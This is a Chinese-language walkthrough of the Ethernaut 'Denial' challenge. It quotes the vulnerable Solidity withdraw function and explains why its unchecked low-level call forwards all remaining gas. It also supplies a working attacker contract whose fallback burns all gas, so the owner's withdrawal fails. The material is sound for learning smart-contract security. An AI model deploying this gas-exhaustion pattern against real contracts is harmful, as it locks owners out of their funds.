# Denial

## Reference
[Denial](https://ethernaut.openzeppelin.com/level/20)

[Denial.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/20-Denial/Denial.sol)

## 目标
作为当前合约的 `partner`, 让 `owner` 地址无法成功退款

## 分析
### withdraw
```solidity
    function withdraw() public {
    uint256 amountToSend = address(this).balance / 100;
    // perform a call without checking return
    // The recipient can revert, the owner will still get their share
    partner.call{value: amountToSend}("");
    // payable(partner).transfer(amountToSend);
    payable(owner).transfer(amountToSend);
    // keep track of last withdrawal time
    timeLastWithdrawn = block.timestamp;
    withdrawPartnerBalances[partner] += amountToSend;
}
```
1. `partner` 通过 `call()` 退款，call发送当前EV吗环境全部剩余的 `gas`
2. `owner` 通过 `transfer()` 退款，`transfer()/send()` 仅发送 `2300 gas`, `transfer()` 在转账失败时会 `revert` 整笔交易
### Denial
1. 作为 `partner`，在 `owner` 退款时会通过 `call` 接收转账
2. `call()` 转账方式会将 `caller` 的全部 `gas` 发送到新的 `EVM` 执行环境
3. 作为 `partner`,可以在 `fallback()` 函数中消耗完全部的 `gas` ,此时，整笔交易会因为没有多余 `gas` 失败
```solidity
contract Attack {
    bytes32 tt;
    fallback() external payable {
        while (gasleft() > 0) {
            tt = keccak256(abi.encodePacked(msg.sender, tt));
        }
    }
}
```

1. `Attack` 合约的 `fallback()` 函数一直执行 `keccak256` 操作消耗 `gas` ,直至消耗完全部 `gas`
